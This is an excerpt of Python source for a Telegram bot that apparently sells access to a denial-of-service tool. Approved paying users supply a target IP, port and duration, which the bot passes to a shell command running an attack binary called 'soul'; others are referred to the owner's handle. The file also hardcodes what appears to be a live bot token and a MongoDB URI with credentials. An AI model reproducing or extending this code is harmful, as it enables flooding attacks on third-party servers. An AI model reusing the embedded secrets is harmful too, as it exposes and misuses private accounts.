...
TOKEN = "7897401223:AAHLtLuoNbLX7-aF3i-_2qssR2ocz6j45mk"
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002357173850
CHANNEL_ID = -1002357173850
error_channel_id = -1002357173850
...
async def run_attack_command_async(target_ip, target_port, duration):
    ...
    attack_process = asyncio.create_subprocess_shell(
        f"./soul {target_ip} {target_port} {duration} 120"
    )
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                       ...
                                       "*Contact the owner for assistance: @HACKKING160.*", parse_mode='Markdown')  # Contact owner message
            return
...
def myinfo_command(message):
    ...
    if not user_data:
        ...
        response += "*For assistance, please contact the owner: @HACKKING160* "  # Contact owner message
    elif user_data.get('plan', 0) == 0:
        # User found but not approved
        response = "*🔒 Your account is still pending approval!* \n"  # Not approved message
        response += "*Please reach out to the owner for assistance: @HACKKING160* 🙏"  # Contact owner message
    else:
